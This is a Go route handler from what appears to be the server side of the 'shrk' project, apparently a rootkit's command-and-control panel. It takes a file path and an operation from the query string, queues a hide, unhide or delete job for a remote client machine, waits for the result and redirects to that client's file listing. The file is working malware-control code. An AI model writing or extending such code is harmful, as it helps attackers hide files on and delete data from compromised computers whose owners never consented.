package routes

import (
	"fmt"
	"net/http"
	"path"

	"github.com/gofiber/fiber/v2"
	"github.com/ngn13/shrk/server/database"
	"github.com/ngn13/shrk/server/joblist"
	"github.com/ngn13/shrk/server/log"
	"github.com/ngn13/shrk/server/util"
)

func GET_do(c *fiber.Ctx) error {
	var (
		client *database.Client
		jobs   *joblist.Type
		job    *joblist.Job

		targetdir string
		targetp   string
		res_str   string
		cmd_str   string
		cmd       byte

		err error
	)

	client = c.Locals("client").(*database.Client)
	jobs = c.Locals("joblist").(*joblist.Type)

	if targetp = c.Query("p"); targetp == "" {
		return util.RenderErr(c, "no path specified", http.StatusBadRequest)
	}

	if targetdir = path.Dir(targetp); targetdir == "." || targetdir == "" {
		targetdir = "/"
	}

	switch cmd_str = c.Query("o"); cmd_str {
	case "unhide":
		cmd = joblist.CMD_UNHIDE

	case "hide":
		cmd = joblist.CMD_HIDE

	case "delete":
		cmd = joblist.CMD_DELETE

	default:
		return util.RenderErr(c, "invalid file operation", http.StatusBadRequest)

	}

	data := util.NewBuffer(targetp)
	res := util.NewBuffer()

	if job, err = jobs.Add(client.ID, cmd, data, res); err != nil {
		log.Fail("failed to add %s path job: %s", cmd_str, err.Error())
		return util.RenderErr(c, "server error", http.StatusInternalServerError)
	}

	defer jobs.Del(job.ID)

	if !job.Wait() {
		log.Debg("%s file job timed out for %s", cmd_str, client.ID)
		return util.RenderErr(c, "client timeout", http.StatusGatewayTimeout)
	}

	if res_str = res.String(); res_str != "success" {
		return util.RenderErr(c, fmt.Sprintf("path %s job failed: %s", cmd_str, res_str), http.StatusGatewayTimeout)
	}

	return util.Redirect(c,
		path.Join("c", client.ID, fmt.Sprintf(
			"files?p=%s", util.Qescape(targetdir),
		)),
	)
}
